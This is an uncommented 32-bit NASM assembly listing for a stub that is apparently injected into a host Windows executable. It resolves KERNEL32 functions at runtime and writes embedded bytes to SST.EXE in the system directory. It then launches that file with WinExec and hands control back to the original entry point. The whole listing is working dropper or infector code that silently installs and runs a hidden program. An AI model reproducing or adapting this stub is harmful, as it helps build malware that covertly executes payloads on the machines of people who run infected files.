   ;entry.old_entry
   ;entry.original_gmh
   ;entry.original_gpa
   ;entry.host_size

   [bits 32]

   STUB_PTR EQU 1238h

   entry:
           push dword 0
     .old_entry equ $-4
           pushad
           mov ebp, dword 0
     .original_gmh equ $-4
           mov ebx, dword 0
     .original_gpa equ $-4
           call .strings
   db "KERNEL32.DLL",0
   db "_lcreat",0
   db "_lclose",0
   db "_lwrite",0
   db "WinExec",0
   db "GetSystemDirectoryA",0,0
   db "\SST.EXE",0

   %define lcreat  esp+16+200h
   %define lclose  esp+12+200h
   %define lwrite  esp+8+200h
   %define WinExec esp+4+200h
   %define GetSystemDirectoryA esp+200h

     .strings:
           mov esi,[esp]
           call [ebp]
           xchg eax,ebp
     .next_api:
           lodsb
           test al,al
           jnz .next_api
           cmp byte [esi],0
           je .done_import
           push esi
           push ebp
           call [ebx]
           push eax
           jmp short .next_api
     .done_import:
           sub esp,200h
           mov edi,esp
           push 200h
           push edi
           call [GetSystemDirectoryA+2*4]
           add edi,eax
           lodsb
     .copy:
           lodsb
           stosb
           test al,al
           jnz .copy
           mov edi,esp
           push byte 0
           push edi
           call [lcreat+2*4]
           inc eax
           jz .error
           dec eax
           push eax
           push dword 0
     .host_size equ $-4
           call .delta
     .delta:
           sub dword [esp],((.delta-entry)+STUB_PTR)
           push eax
           call [lwrite+4*4]
           call [lclose+1*4]
           mov eax,esp
           push byte 0
           push eax
           call [WinExec+2*4]
     .error:
           add esp,200h+5*4
           popad
           ret
